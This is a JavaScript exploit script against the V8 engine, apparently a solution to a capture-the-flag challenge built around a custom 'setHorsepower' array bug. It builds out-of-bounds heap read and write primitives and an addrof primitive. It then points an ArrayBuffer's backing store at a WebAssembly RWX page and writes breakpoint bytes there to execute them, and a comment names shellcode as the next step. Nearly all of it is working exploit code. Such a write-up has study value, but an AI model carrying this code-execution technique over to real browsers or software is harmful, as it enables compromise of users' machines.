// Game plan:
// [X] 1: read_in_heap and write_in_heap (Through JSArray of floats)
// [X] 2: addrof (Change float arr to obj arr)
// [X] 3: Set up an ArrayBuffer to point to a wasm RWX page
// []  4: Shellcode (See shellcode.js)

/*
    We're now going to create a WASM module, which allocates a read-write page, and then use an ArrayBuffer to 
    write to that page by changing it's data pointer (Where the elements are writte) which v8 calls a backing store.

    We write debug breakpoint interrupts so we can easily test it
*/

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ STEP 1
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}

function float_arr_pointing_at(addr) {
  var float_buf = [9.1, 9.2];
  float_buf.setHorsepower(4);
  // Write the pointer to the low 32 bits of the second 64bits of the float_buf array, which is the compressed element pointer
  // It should now point to addr, so we car read/write float_buf[0] at that address
  float_buf[3] = compress_elementptr(float_buf[3], addr);
  return float_buf;
}
function read_in_heap(addr) {
  return float_arr_pointing_at(addr)[0];
}
function write_in_heap(addr, value) {
  float_arr_pointing_at(addr)[0] = value;
}

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ END STEP 1
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ STEP 2
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

var obj_arr = [0.1];
obj_arr.setHorsepower(4);

var obj_arr_elementptr = ftoi_low32(obj_arr[2]);
var obj_arr_base = obj_arr_elementptr + 8n + 8n; // offset and 1 element
var obj_arr_elementptr_addr = obj_arr_base + 8n; // Skip first 64bit value (compressed map?)

function addrof(obj) {
  obj_arr[0] = obj;
  var elementptr = ftoi_low32(read_in_heap(obj_arr_elementptr_addr));
  var val = ftoi_low32(read_in_heap(elementptr + 8n));
  return val;
}

// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------ END STEP 2
// ------------------------------------------------------------------------------------------
// ------------------------------------------------------------------------------------------

// Just a big enough valid wasm module, doesn't really matter what's in it much as far as I know
// https://wasdk.github.io/WasmFiddle/
var wasm_data = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10,
  138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 0, 11,
]);
var module = new WebAssembly.Module(wasm_data);
var instance = new WebAssembly.Instance(module);
var exec_machine_code = instance.exports.main;

// Remove 1byte offset
var wasm_instance_base_addr = addrof(instance) - 1n;
console.log("wasm instance:");
%DebugPrint(instance);
console.log(
  "wasm_instance_base_addr: (Check it's the address in the instance DebugPrint above"
);
print_hex(wasm_instance_base_addr);
// offset to field found using GEF search-pattern
var rwx_page_ptr_addr = wasm_instance_base_addr + 105n;
console.log("rwx_page_ptr_addr");
print_hex(rwx_page_ptr_addr);
// We should offset by the function index in the module, but it is 0
//  (Looks like a table of jump instructions)
var rwx_page_ptr = ftoi(read_in_heap(rwx_page_ptr_addr));
console.log("rwx_page_ptr");
print_hex(rwx_page_ptr);
console.log("If you have gdb and gef, you can check if the above address");
console.log("is correct with pipe vmmap | grep rwx");

var arr_buf = new ArrayBuffer(0x400);
var dataview = new DataView(arr_buf);

console.log("arr_buf:");
%DebugPrint(arr_buf);
var arr_buf_addr = addrof(arr_buf);

console.log(
  "arr_buf_addr:(Check it's the address in the arr_buf DebugPrint above)"
);
print_hex(arr_buf_addr);
// offset found using %DebugPrint on arr_buf and gef search-pattern
// offset is actually 21 but we didn't remove the 1byte offset in the compressed ptr
var arr_buf_backing_store_addr = arr_buf_addr + 20n;
console.log("arr_buf_backing_store_addr:");
print_hex(arr_buf_backing_store_addr);
// Write the wasm RWX page address to the arr_buf data pointer/backing store
write_in_heap(arr_buf_backing_store_addr, itof(rwx_page_ptr));
console.log("rwx_page_ptr");
print_hex(rwx_page_ptr);
console.log("arr_buf after write: (Backing store should be rwx_page_ptr)");
%DebugPrint(arr_buf);

// int 03 (debug breakpoint)
dataview.setUint32(0, 0xcccc, true);
dataview.setUint32(1, 0xcccc, true);

console.log("Should Trace/breakpoint trap now");
exec_machine_code();

while (true) {}
